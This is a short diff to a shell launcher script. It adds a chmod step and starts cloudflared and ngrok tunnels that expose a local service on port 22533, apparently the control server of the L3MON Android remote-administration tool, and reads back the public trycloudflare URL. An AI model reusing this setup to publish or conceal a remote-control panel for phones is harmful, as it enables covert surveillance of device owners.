@@ -11,7 +11,9 @@ Purple='\033[0;35m'
 Cyan='\033[0;36m'
 White='\033[0;37m'
 clear='\033[0m'
+chmod +x /L3MON/ngrok/cloudflared-linux-amd64
 /L3MON/ngrok/cloudflared-linux-amd64 tunnel -url 127.0.0.1:22533 --logfile /L3MON/ngrok/.cf.log > /dev/null 2>&1 &
+
 /L3MON/ngrok/ngrok start --all > /dev/null &
 sleep 8
 cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
